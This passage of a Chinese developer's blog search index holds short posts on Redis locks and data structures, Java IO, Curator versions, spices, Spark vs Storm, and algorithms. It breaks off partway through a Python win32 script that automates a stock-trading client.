LOCK_KEY, expire);</span><br><span class="line">    <span class="keyword">return</span> redisTemplate.opsForValue().setIfAbsent(LOCK_KEY, expire);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">_releaseLock</span><span class="params">()</span> &#123;</span><br><span class="line">    redisTemplate.delete(LOCK_KEY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 分布式锁 </tag>
            
            <tag> lock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA IO 流</title>
      <link href="/2017/06/09/JAVA%20IO%20%E6%B5%81/"/>
      <url>/2017/06/09/JAVA%20IO%20%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<p>流分为：文件(File&#x2F;RandomAccessFile)、字符(Reader&#x2F;Writer)、字节(InputStream&#x2F;OutputStream)的操作。字符、字节是一一对应的，一个读取一个输出。</p><p>对应的设计模式：装饰器模式</p><p><img src="/assets/images/java_io.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">_excuteSaveFile</span><span class="params">(Request request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    request.addHeader(<span class="string">&quot;User-Agent&quot;</span>, Constant.HTTP_USER_AGENT).addHeader(<span class="string">&quot;Accept-Language&quot;</span>, <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4,zh-TW;q=0.2&quot;</span>);</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="built_in">this</span>.executor.execute(request).returnContent().asStream();</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;/tmp/sms/&quot;</span> + UUID.randomUUID().toString() + <span class="string">&quot;.png&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> inByte;</span><br><span class="line">    <span class="keyword">while</span> ((inByte = inputStream.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        outputStream.write(inByte);</span><br><span class="line">    &#125;</span><br><span class="line">    outputStream.close();</span><br><span class="line">    inputStream.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>上传验证绕过</title>
      <link href="/2017/05/29/%E4%B8%8A%E4%BC%A0%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/"/>
      <url>/2017/05/29/%E4%B8%8A%E4%BC%A0%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>整理文档发现了这个文件，回想当年在学校黑网站的日子历历在目。</p><p>上传文件绕过附件整理了常见的技巧、验证方法。在自己实现上传功能的时候应该注意。</p><p>[文件上传绕过整理.pdf](&#x2F;assets&#x2F;files&#x2F;Bypass Upload ValidationFramework.pdf)</p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 各数据结构</title>
      <link href="/2017/05/21/Redis%20%E5%90%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2017/05/21/Redis%20%E5%90%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="Redis-命令文档"><a href="#Redis-命令文档" class="headerlink" title="Redis 命令文档"></a>Redis 命令文档</h2><ul><li><a href="http://doc.redisfans.com/">http://doc.redisfans.com</a></li><li><a href="https://redis.io/commands">https://redis.io/commands</a></li></ul><h2 id="Redis的六种数据结构"><a href="#Redis的六种数据结构" class="headerlink" title="Redis的六种数据结构"></a>Redis的六种数据结构</h2><ul><li>Strings</li><li>Hashs</li><li>Lists</li><li>Sets</li><li>Sorted Sets</li><li>Pub&#x2F;Sub</li></ul><span id="more"></span><h3 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h3><p>Strings 数据结构是简单的key-value类型，value其实不仅是String，也可以是数字。可以使用在常规计数方面，比如说：<strong>微博数、粉丝数、key-value数据</strong></p><h3 id="Hashs"><a href="#Hashs" class="headerlink" title="Hashs"></a>Hashs</h3><p>在Memcached中，我们经常将一些结构化的信息打包成hashmap，在客户端序列化后存储为一个字符串的值，比如用户的昵称、年龄、性别、积分等，这时候在需要修改其中某一项时，通常需要将所有值取出反序列化后，修改某一项的值，再序列化存储回去。这样不仅增大了开销，也不适用于一些可能并发操作的场合（比如两个并发的操作都需要修改积分）。</p><p>Redis的Hash结构可以使你像在数据库中Update一个属性一样只修改某一项属性值。</p><p>它是一个String类型的field和value的映射表，它的添加和删除都是平均的，hash特别适合用于存储对象，对于将对象存储成字符串而言，hash会占用更少的内存，并且可以更方便的存取整个对象。它和java的HashMap完全类似。</p><p>通常用在，<strong>存储部分变更数据，如用户信息</strong>等。</p><h3 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h3><p>Lists 就是链表，可以轻松地实现最新消息排序等功能。Lists的另一个应用就是消息队列，可以利用Lists的PUSH操作，将任务存在Lists中，然后工作线程再用POP操作将任务取出进行执行。Redis还提供了操作Lists中某一段的api，你可以直接查询，删除Lists中某一段的元素。</p><p>Redis的list是每个子元素都是String类型的双向链表，可以通过push和pop操作从列表的头部或者尾部添加或者删除元素，这样<font color='red'><strong>List即可以作为栈，也可以作为队列</strong></font>。</p><p>一般情况Lists 会是一个<strong>消息队列系统</strong>，使用list可以构建队列系统，使用sorted set甚至可以构建有优先级的队列系统。比如：将Redis用作日志收集器队列，多个端点将日志信息写入Redis，然后一个worker统一将所有日志写到磁盘。</p><p><strong>取最新N个数据的操作</strong>、记录前N个最新登陆的用户Id列表，超出的范围可以从数据库中获得。</p><h3 id="Sets"><a href="#Sets" class="headerlink" title="Sets"></a>Sets</h3><p>Sets 就是一个集合，集合的概念就是一堆不重复值的组合。利用Redis提供的Sets数据结构，可以存储一些集合性的数据，提供交集，并集，差集操作。Set是集合，是String类型的无序集合，set是通过hashtable实现的，概念和数学中个的集合基本类似，可以交集，并集，差集等等，set中的元素是没有顺序的。</p><p>案例：</p><p><strong>在微博应用中，可以将一个用户所有的关注人存在一个集合中，将其所有粉丝存在一个集合</strong>。</p><p>Redis还为集合提供了求交集、并集、差集等操作，可以非常方便的实现如共同关注、共同喜好、二度好友等功能，对上面的所有集合操作，你还可以使用不同的命令选择将结果返回给客户端还是存集到一个新的集合中。</p><p>使用案例：<strong>获取某段时间所有数据去重值</strong></p><h3 id="Sorted-Sets"><a href="#Sorted-Sets" class="headerlink" title="Sorted Sets"></a>Sorted Sets</h3><p>和Sets相比，Sorted Sets增加了一个权重参数score，使得集合中的元素能够按score进行有序排列，比如一个存储全班同学成绩的Sorted Sets，其集合value可以是同学的学号，而score就可以是其考试得分，这样在数据插入集合的时候，就已经进行了天然的排序。可以用Sorted Sets来做带权重的队列，比如普通消息的score为1，重要消息的score为2，然后工作线程可以选择按score的倒序来获取工作任务。让重要的任务优先执行。</p><p>使用案例：<strong>排行榜应用，取TOP N操作</strong></p><p>这个需求与上面需求的不同之处在于，前面操作以时间为权重，这个是以某个条件为权重，比如按顶的次数排序，这时候就需要我们的sorted set出马了，将你要排序的值设置成sorted set的score，将具体的数据设置成相应的value，每次只需要执行一条ZADD命令即可。</p><h3 id="Pub-x2F-Sub"><a href="#Pub-x2F-Sub" class="headerlink" title="Pub&#x2F;Sub"></a>Pub&#x2F;Sub</h3><p>Pub&#x2F;Sub 从字面上理解就是发布（Publish）与订阅（Subscribe），在Redis中，你可以设定对某一个key值进行消息发布及消息订阅，当一个key值上进行了消息发布后，所有订阅它的客户端都会收到相应的消息。这一功能最明显的用法就是<strong>用作实时消息系统</strong>，比如普通的<strong>即时聊天，群聊</strong>等功能。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Curator 版本折腾</title>
      <link href="/2017/05/19/Curator%20%E7%89%88%E6%9C%AC%E6%8A%98%E8%85%BE/"/>
      <url>/2017/05/19/Curator%20%E7%89%88%E6%9C%AC%E6%8A%98%E8%85%BE/</url>
      
        <content type="html"><![CDATA[<p>最近接手一个短信系统，其中有一个代理模块是HA高可用的，HA的方法是每次启动proxy，proxy会在zookeeper中去leader election，这样便实现高可用。</p><span id="more"></span><p>迁移老项目osgi到新项目maven + Spring，运行一直提示错误，刚刚Connected就有被Suspend，然后又是Reconnect。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EndOfStreamException: Unable to read additional data from client</span><br></pre></td></tr></table></figure><p>搜索了好多，给的结果大部分是说，当zookeeper实例的个数不满足集群存活个数的条件的时候，就会无法读取数据。</p><p>因为本机的zookeeper是单实例的情况，应该不是存活个数的问题。</p><p>最后无解，把example弄下来，跑了下example没问题，但是使用本机上的zookeeper一样存在问题，猜测可能是版本问题，去官网找文档，发现Curator对zookeeper的实例版本是有要求的，降低Curator版本，问题解决。</p><p>附官网上面的一句话：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The are currently two released versions of Curator, 2.x.x and 3.x.x:</span><br><span class="line"></span><br><span class="line">Curator 2.x.x - compatible with both ZooKeeper 3.4.x and ZooKeeper 3.5.x</span><br><span class="line">Curator 3.x.x - compatible only with ZooKeeper 3.5.x and includes support for new features such as dynamic reconfiguration, etc.</span><br><span class="line">ZooKeeper 3.5.x adds a number of new features including dynamic reconfiguration, watcher removal and others.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Curator </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>香料</title>
      <link href="/2017/05/14/%E9%A6%99%E6%96%99/"/>
      <url>/2017/05/14/%E9%A6%99%E6%96%99/</url>
      
        <content type="html"><![CDATA[<p>这些是一些常用的香料，附带了一些说明，卤水。</p><h4 id="小茴香"><a href="#小茴香" class="headerlink" title="小茴香"></a>小茴香</h4><p><strong>小茴香</strong>，基础调料。所有卤料和一般炖肉均用到小茴香，亲和力高，百搭。一来可去肉腥，二来可重新添香，味道比八角淡，多加一些。</p><h4 id="草果"><a href="#草果" class="headerlink" title="草果"></a>草果</h4><p><strong>草果</strong>，有辛香。和牛羊肉是绝配，特别是羊肉，炖汤的时候加入很鲜美，卤牛肉可多加一颗草果。</p><span id="more"></span><h4 id="香果"><a href="#香果" class="headerlink" title="香果"></a>香果</h4><p><strong>香果</strong>，微苦，有辣味。香果是未去皮的肉豆蔻，味道浓烈，加一颗即可。</p><h4 id="肉豆蔻"><a href="#肉豆蔻" class="headerlink" title="肉豆蔻"></a>肉豆蔻</h4><p><strong>肉豆蔻</strong>，有甜香，喜油腻。炖鸭肉或猪肉的时候可多加一颗，潮汕卤里也多有肉豆蔻。</p><h4 id="山栀"><a href="#山栀" class="headerlink" title="山栀"></a>山栀</h4><p><strong>山栀</strong>，染色明显。有和番红花一样的染色能力，但价格便宜，味清凉略苦。</p><h4 id="川砂仁"><a href="#川砂仁" class="headerlink" title="川砂仁"></a>川砂仁</h4><p><strong>川砂仁</strong>，姜科，有类似于樟木的香味。川卤里必用的调料，微辣。</p><h4 id="八角"><a href="#八角" class="headerlink" title="八角"></a>八角</h4><p><strong>八角</strong>，味重，三颗足够。</p><h4 id="桂皮"><a href="#桂皮" class="headerlink" title="桂皮"></a>桂皮</h4><p><strong>桂皮</strong>，芳香偏甜，去腥一绝。</p><h4 id="山奈"><a href="#山奈" class="headerlink" title="山奈"></a>山奈</h4><p><strong>山奈</strong>，也叫沙姜。属辛辣味调料，跟干姜片明显的区别在于肉质细密一些。</p><h4 id="白蔻"><a href="#白蔻" class="headerlink" title="白蔻"></a>白蔻</h4><p><strong>白蔻</strong>，炖肉用香料，相对其他豆蔻类味道温和，亲和力也高，可多加。</p><h4 id="甘草"><a href="#甘草" class="headerlink" title="甘草"></a>甘草</h4><p><strong>甘草</strong>，有甘甜味，在各类卤水中均有使用。一来可以增甜提鲜，二来也有防腐作用。</p><h4 id="丁香"><a href="#丁香" class="headerlink" title="丁香"></a>丁香</h4><p><strong>丁香</strong>，有异香。卤味有言，若想骨里香，就得放丁香。丁香味浓且烈，又不容易散，三升水最多加三粒。</p><h4 id="干姜片"><a href="#干姜片" class="headerlink" title="干姜片"></a>干姜片</h4><p><strong>干姜片</strong>，去腥。</p><h4 id="陈皮"><a href="#陈皮" class="headerlink" title="陈皮"></a>陈皮</h4><p><strong>陈皮</strong>，作用奇特。可以中和浓烈刺激的味道，比如肉蔻草果煮出太浓的肉味，丁香的异香。同时也有不错的提鲜作用，特别是卤鸡的时候。</p><h4 id="香叶"><a href="#香叶" class="headerlink" title="香叶"></a>香叶</h4><p><strong>香叶</strong>，芳香类调料，味道易散，可稍微多加一些。</p><h4 id="黄冰糖"><a href="#黄冰糖" class="headerlink" title="黄冰糖"></a>黄冰糖</h4><p><strong>黄冰糖</strong>，中和咸味和提鲜。</p><h4 id="红曲米"><a href="#红曲米" class="headerlink" title="红曲米"></a>红曲米</h4><p><strong>红曲米</strong>，添加红色。</p>]]></content>
      
      
      <categories>
          
          <category> Daily Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 香料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark与Storm的对比</title>
      <link href="/2017/05/13/Spark%E4%B8%8EStorm%E7%9A%84%E5%AF%B9%E6%AF%94/"/>
      <url>/2017/05/13/Spark%E4%B8%8EStorm%E7%9A%84%E5%AF%B9%E6%AF%94/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>对比点</th><th>Storm</th><th>Spark Streaming</th></tr></thead><tbody><tr><td>实时计算模型</td><td>纯实时，来一条数据，处理一条数据</td><td>准实时，对一个时间段内的数据收集起来，作为一个RDD，再处理</td></tr><tr><td>实时计算延迟度</td><td>毫秒级</td><td>秒级</td></tr><tr><td>吞吐量</td><td>低</td><td>高</td></tr><tr><td>事务机制</td><td>支持完善</td><td>支持，但不够完善</td></tr><tr><td>健壮性 &#x2F; 容错性</td><td>ZooKeeper，Acker，非常强</td><td>Checkpoint，WAL，一般</td></tr><tr><td>动态调整并行度</td><td>支持</td><td>不支持</td></tr></tbody></table><p>RDD(Resilient Distributed Datasets)，弹性分布式数据集。</p><p>对实时性要求高选择Storm，如银行金融系统等。</p><p>相对于Storm来讲，不满足的实时场景，在不要求纯实时，不要求强大可靠的事务机制，不要求动态调整并行度，那么可以考虑使用Spark Streaming。</p><p>在Spark的生态中，还包含了Spark Core离线批处理、Spark SQL交互式查询，如果在实时计算中需要这些地方的时候，Spark会更好。</p>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
            <tag> Storm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kcptun</title>
      <link href="/2017/05/12/Kcptun/"/>
      <url>/2017/05/12/Kcptun/</url>
      
        <content type="html"><![CDATA[<p>Kcptun能有效的加速科学上网，目前最低配置的搬瓦工能够看720p。Kcptun客户端非常省资源，可参考GitHub详细说明。</p><ul><li><a href="http://www.gblm.net/209.html">Kcptun给Shadowsocks加速</a></li><li><a href="https://github.com/xtaci/kcptun">https://github.com/xtaci/kcptun</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kcptun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>删除链表中的某一个节点</title>
      <link href="/2017/05/11/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E4%B8%AA%E8%8A%82%E7%82%B9/"/>
      <url>/2017/05/11/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>以前在学校的时候面试被问过，上个月面试的时候再次被问到，当时想了想竟然想出来了。但是过了几天又一下忘了。</p><p>问题：一个单向链表，给其中的一个节点p，现在要删掉这个节点，需要怎么操作，没有链表的头节点，所以不能遍历。</p><p>参考图片解决方案:</p><p><img src="/assets/images/linked_list_delete_p.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Data Structures and Algorithms </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>负载均衡调度算法</title>
      <link href="/2017/05/11/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/"/>
      <url>/2017/05/11/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://blog.csdn.net/pzw_0612/article/details/47357221">轮询调度算法(Round-Robin Scheduling)</a></li><li><a href="http://www.cnblogs.com/huligong1234/p/3819979.html">权重轮询调度算法(WeightedRound-RobinScheduling)</a></li></ul><p>轮询调度算法，数据结构，类需要包含轮训调度计算器AtomicInteger，每次只需要求余即可。</p><p>权重轮询调度算法，第一次返回权值取最大的那个服务器，之后通过权重的不断递减寻找适合的服务器返回，直到轮询结束，权值返回为0。 </p>]]></content>
      
      
      <categories>
          
          <category> Data Structures and Algorithms </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python调用通达信交易客户端</title>
      <link href="/2017/05/10/Python%E8%B0%83%E7%94%A8%E9%80%9A%E8%BE%BE%E4%BF%A1%E4%BA%A4%E6%98%93%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
      <url>/2017/05/10/Python%E8%B0%83%E7%94%A8%E9%80%9A%E8%BE%BE%E4%BF%A1%E4%BA%A4%E6%98%93%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<p>没啥说的，方案和Python调用QQ发消息一致。需要通过<code>spy.exe</code>来获取窗口句柄。</p><p>结合RQAlpha等量化工具或量化平台，可实现即时下单。另可采用实盘易方案。</p><p>不多些什么，仅当保存一下代码。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> win32api, win32gui, win32con, win32com</span><br><span class="line"><span class="keyword">import</span> win32clipboard <span class="keyword">as</span> CP</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------utils------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_idxSubHandle</span>(<span class="params">pHandle, winClass, index=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(index) == <span class="built_in">int</span> <span class="keyword">and</span> index&gt;=<span class="number">0</span></span><br><span class="line">    handle = win32gui.FindWindowEx(pHandle, <span class="number">0</span>, winClass, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">while</span> index&gt;<span class="number">0</span>:</span><br><span class="line">        handle = win32gui.FindWindowEx(pHandle, handle, winClass, <span class="literal">None</span>)</span><br><span class="line">        index -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> handle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_clipboard</span>():</span><br><span class="line">    win32api.keybd_event(<span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    win32api.keybd_event(<span class="number">67</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    win32api.keybd_event(<span class="number">67</span>, <span class="number">0</span>, win32con.KEYEVENTF_KEYUP, <span class="number">0</span>)</span><br><span class="line">    win32api.keybd_event(<span class="number">17</span>, <span class="number">0</span>, win32con.KEYEVENTF_KEYUP, <span class="number">0</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    CP.OpenClipboard()</span><br><span class="line">    raw_text = CP.GetClipboardData(win32con.CF_TEXT)</span><br><span class="line">    CP.CloseClipboard()</span><br><span class="line">    decode = raw_text.decode(<span class="string">&#x27;gb2312&#x27;</span>).split()</span><br><span class="line">    decode.pop()</span><br><span class="line">    <span class="keyword">return</span> decode</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------------------------Class_HT------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.Title = <span class="string">&#x27;网上股票交易系统5.0&#x27;</span></span><br><span class="line">        self.__get_handles()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_handles</span>(<span class="params">self</span>):</span><br><span class="line">        Main = win32gui.FindWindow(<span class="number">0</span>, self.Title)  <span class="comment"># HT交易窗口</span></span><br><span class="line">        Frame = win32gui.GetDlgItem(Main, <span class="number">59648</span>)  <span class="comment"># 操作窗口框架</span></span><br><span class="line">        Afxwnd = win32gui.GetDlgItem(Frame, <span class="number">59648</span>) <span class="comment"># 操作窗口框架</span></span><br><span class="line">        Hexin = win32gui.GetDlgItem(Afxwnd, <span class="number">129</span>)</span><br><span class="line">        Scrolwnd = win32gui.GetDlgItem(Hexin, <span class="number">200</span>) <span class="comment"># 左部折叠菜单控件</span></span><br><span class="line">        treev = win32gui.GetDlgItem(Scrolwnd, <span class="number">129</span>) <span class="comment"># 左部折叠菜单控件</span></span><br><span class="line">        <span class="comment"># 获取委托窗口所有控件句柄</span></span><br><span class="line">        win32api.PostMessage(treev, win32con.WM_KEYDOWN, win32con.VK_F1, <span class="number">0</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        F_Bentrust = win32gui.GetDlgItem(Frame, <span class="number">59649</span>) <span class="comment"># 委托窗口框架</span></span><br><span class="line">        self.E_Bsymbol = win32gui.GetDlgItem(F_Bentrust, <span class="number">1032</span>)  <span class="comment"># 买入代码输入框</span></span><br><span class="line">        self.E_Bprice = win32gui.GetDlgItem(F_Bentrust, <span class="number">1033</span>)  <span class="comment"># 买入价格输入框</span></span><br><span class="line">        self.E_Bvol = win32gui.GetDlgItem(F_Bentrust, <span class="number">1034</span>)  <span class="comment"># 买入数量输入框</span></span><br><span class="line">        self.B_Buy = win32gui.GetDlgItem(F_Bentrust, <span class="number">1006</span>)  <span class="comment"># 买入确认按钮</span></span><br><span class="line">        self.B_refresh = win32gui.GetDlgItem(F_Bentrust, <span class="number">32790</span>)  <span class="comment"># 刷新持仓按钮</span></span><br><span class="line">        F_Bhexin = win32gui.GetDlgItem(F_Bentrust, <span class="number">1047</span>)  <span class="comment"># 持仓显示框架</span></span><br><span class="line">        F_Bhexinsub = win32gui.GetDlgItem(F_Bhexin, <span class="number">200</span>)  <span class="comment"># 持仓显示框架</span></span><br><span class="line">        self.G_position = win32gui.GetDlgItem(F_Bhexinsub, <span class="number">1047</span>)  <span class="comment"># 持仓列表</span></span><br><span class="line">        win32api.PostMessage(treev, win32con.WM_KEYDOWN, win32con.VK_F2, <span class="number">0</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        F_Sentrust = win32gui.GetDlgItem(Frame, <span class="number">59649</span>)  <span class="comment"># 委托窗口框架</span></span><br><span class="line">        self.E_Ssymbol = win32gui.GetDlgItem(F_Sentrust, <span class="number">1032</span>)  <span class="comment"># 卖出代码输入框</span></span><br><span class="line">        self.E_Sprice = win32gui.GetDlgItem(F_Sentrust, <span class="number">1033</span>)  <span class="comment">#卖出价格输入框</span></span><br><span class="line">        self.E_Svol = win32gui.GetDlgItem(F_Sentrust, <span class="number">1034</span>)  <span class="comment"># 卖出数量输入框</span></span><br><span class="line">        self.B_Sell = win32gui.GetDlgItem(F_Sentrust, <span class="number">1006</span>)  <span class="comment"># 卖出确认按钮</span></span><br><span class="line">        <span class="comment">#撤单窗口</span></span><br><span class="line">        win32api.PostMessage(treev, win32con.WM_KEYDOWN, win32con.VK_F3, <span class="number">0</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        F_Centrust = win32gui.GetDlgItem(Frame, <span class="number">59649</span>)  <span class="comment"># 撤单窗口框架</span></span><br><span class="line">        self.E_Csymbol = win32gui.GetDlgItem(F_Centrust, <span class="number">3348</span>)  <span class="comment"># 卖出代码输入框</span></span><br><span class="line">        self.B_Csort = win32gui.GetDlgItem(F_Centrust, <span class="number">3349</span>) <span class="comment"># 查询代码按钮</span></span><br><span class="line">        self.B_Cbuy = win32gui.GetDlgItem(F_Centrust, <span class="number">30002</span>) <span class="comment"># 撤买</span></span><br><span class="line">        self.B_Csell = win32gui.GetDlgItem(F_Centrust, <span class="number">30003</span>)  <span class="comment"># 撤卖</span></span><br><span class="line">        F_Chexin = win32gui.GetDlgItem(F_Centrust, 